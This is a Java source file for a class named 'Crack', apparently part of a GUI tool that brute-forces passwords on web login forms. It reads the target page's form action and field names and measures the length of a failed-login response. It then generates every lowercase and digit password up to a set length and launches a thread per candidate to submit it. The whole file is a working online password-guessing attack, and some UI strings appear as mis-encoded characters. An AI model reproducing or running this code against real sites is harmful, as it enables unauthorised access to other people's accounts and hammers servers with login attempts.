package com.form;

import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.Iterator;
import java.util.List;
import java.util.Scanner;

import com.graphicaluserinterface.Form;

public class Crack implements Runnable {
	char[] charSet = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a',
			'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
			'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'/*, 'A',
			'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N',
			'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '~',
			'!', '@', '#', '$', '^', '&', '*', '(', ')', '-', '_', '=', ',',
			'.', '/', '\\', '<', '>', '?', ':', ';' */};
	public String name;
	public String pass;
	public int length;
	boolean flag = true;
	boolean isSucceed=false;
	String nameOfName;
	String nameOfPass;
	String url;
	int active;
	String action;
	int wrongLen;
	Form form;
	public Crack(String name, int length, String url,Form form) {
		// TODO Auto-generated constructor stub
		this.name = name;
		this.length = length;
		this.url = url;
		this.active = 0;
		this.pass="";
		this.form=form;
	}

	@Override
	public void run() {
		// TODO Auto-generated method stub
		form.crackBtn.setText("Õ£÷π");
		String former = "";
		int index = 0;
		GetAction getaction = new GetAction(url);
		action = getaction.getAction();
		List<String> formParameter = getaction.getFormParameter();
		Iterator<String> it = formParameter.iterator();
		if (it.hasNext()) {
			nameOfName = it.next();

		}
		if (it.hasNext()) {
			nameOfPass = it.next();
		}
		try {
			wrongLen=findWrongLen();
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		makePassword(former, index);
		if(isSucceed)
			form.resultPass.setText(pass);
		else
			form.resultPass.setText("Œ¥’“µΩ");
		form.crackBtn.setText("∆∆Ω‚");
	}

	public void makePassword(String former, int index) {
		if (index == this.length - 1) {
			for (int i = 0; i < charSet.length; i++) {
				CrackThread ct=new CrackThread(this,nameOfName, name, nameOfPass, former+charSet[i], wrongLen, action);
				Thread t=new Thread(ct);
				active++;
				t.start();
			}
			while(active>0){
			}
		} else {
			for (int i = 0; i < charSet.length && !isSucceed&&flag; i++) {
				makePassword(former + charSet[i], index + 1);
			}
		}
	}
	public void stop(){
		flag=false;
	}
	public int findWrongLen() throws Exception {
		int[] length = new int[3];
		for (Integer i = 0; i < 3; i++) {
			URL urlCon = new URL(action);
			URLConnection connection = urlCon.openConnection();
			connection.setDoOutput(true);

			PrintWriter out = new PrintWriter(connection.getOutputStream());

			out.print(nameOfName);
			out.print('=');
			out.print(URLEncoder.encode(name, "UTF-8"));
			out.print('&');
			out.print(nameOfPass);
			out.print('=');
			out.print(URLEncoder.encode(i.toString(), "UTF-8"));

			out.close();

			Scanner in;
			StringBuilder response = new StringBuilder();

			try {
				in = new Scanner(connection.getInputStream());
			} catch (IOException e) {
				if (!(connection instanceof HttpURLConnection))
					throw e;
				InputStream err = ((HttpURLConnection) connection)
						.getErrorStream();
				if (err == null)
					throw e;
				in = new Scanner(err);
			}

			while (in.hasNextLine()) {
				response.append(in.nextLine());
				response.append("\n");
			}
			length[i] = response.length();
		}
		if (Math.abs(length[0] - length[1]) < 3)
			return length[2];
		else if (Math.abs(length[0] - length[2]) < 3)
			return length[1];
		else
			return length[0];
	}
}
